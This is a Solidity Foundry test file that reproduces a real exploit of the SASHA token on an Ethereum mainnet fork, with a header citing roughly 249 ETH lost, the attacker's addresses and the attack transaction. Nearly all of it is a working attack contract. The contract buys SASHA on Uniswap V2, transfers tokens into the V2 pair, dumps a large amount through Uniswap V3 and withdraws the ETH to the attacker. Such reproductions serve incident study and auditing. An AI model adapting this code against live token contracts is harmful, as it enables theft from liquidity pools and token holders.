// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~249 ETH (~$600K USD)
// Attacker : 0x493c5655D40B051a64bc88A6af21D73d3A9B72A2 (Shezmu Attacker 3)
// Attack Contract : https://etherscan.io/address/0x991493900674b10bdf54bdfe95b4e043257798cf
// Attack Tx : https://app.blocksec.com/explorer/tx/eth/0xd9fdc7d03eec28fc2453c5fa68eff82d4c297f436a6a5470c54ca3aecd2db17e

// @Analysis
 

// Contracts involved
address constant SASHA = 0xD1456D1b9CEb59abD4423a49D40942a9485CeEF6;
address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant UniswapV2_Router2 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant UniswapV3_Router2 = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;
address constant UniswapV2_SASHA21 = 0xB23FC1241e1Bc1a5542a438775809d38099838fe;

contract SASHAToken_exp is Test {
    address attacker = 0x81F48A87Ec44208c691f870b9d400D9c13111e2E;

    function setUp() public {
        vm.createSelectFork("mainnet", 20_905_302 - 1);

        vm.label(SASHA, "SASHA");
        vm.label(weth, "WETH");
        vm.label(UniswapV2_Router2, "Uniswap V2: Router 2");
        vm.label(UniswapV3_Router2, "Uniswap V3: Router 2");
        vm.label(UniswapV2_SASHA21, "Uniswap V2: SASHA 21");

        vm.label(attacker, "Attacker");

        vm.deal(attacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker);

        SASHAToken_AttackContract attackC = new SASHAToken_AttackContract();
        payable(address(attackC)).transfer(0.08 ether);

        attackC.attack();

        // Simulate withdraw
        attackC.withdraw();

        vm.stopPrank();

        console.log("balance: ", attacker.balance - 1 ether);
    }

    fallback() external payable {}
}

contract SASHAToken_AttackContract {
    address payable public attacker;

    constructor() public {
        attacker = payable(msg.sender);
    }

    function attack() public {
        // Approve
        IWETH(payable(weth)).approve(UniswapV2_Router2, type(uint256).max);
        IERC20(SASHA).approve(UniswapV2_Router2, type(uint256).max);
        IERC20(SASHA).approve(UniswapV3_Router2, type(uint256).max);

        // Deposit
        IWETH(payable(weth)).deposit{value: 0.07 ether}();

        // Swap
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = SASHA;
        Uni_Router_V2(UniswapV2_Router2).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            70_000_000_000_000_000, // amountIn
            1, // amountOutMin
            path, // path
            address(this), // to
            4_324_324_234_244 // deadline
        );

        // console.log("SASHA balance: ", IERC20(SASHA).balanceOf(address(this)));

        IERC20(SASHA).transfer(UniswapV2_SASHA21, 1_000_000_000_000_000_000);

        UniswapV3Router.ExactInputSingleParams memory params = UniswapV3Router.ExactInputSingleParams({
            tokenIn: SASHA,
            tokenOut: weth,
            fee: 10_000,
            recipient: address(this),
            amountIn: 99_000_000_000_000_000_000_000,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });

        UniswapV3Router(UniswapV3_Router2).exactInputSingle(params);

        IWETH(payable(weth)).withdraw(249_276_511_929_373_786_924);

        // console.log("balance: ", address(this).balance);
    }

    fallback() external payable {
        // payable(attacker).transfer(address(this).balance);
    }

    function withdraw() public payable {
        require(msg.sender == attacker, "Not the contract owner");

        attacker.transfer(address(this).balance);
    }
}

interface UniswapV3Router is IERC20 {
    // Uniswap V3: SwapRouter
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);
}
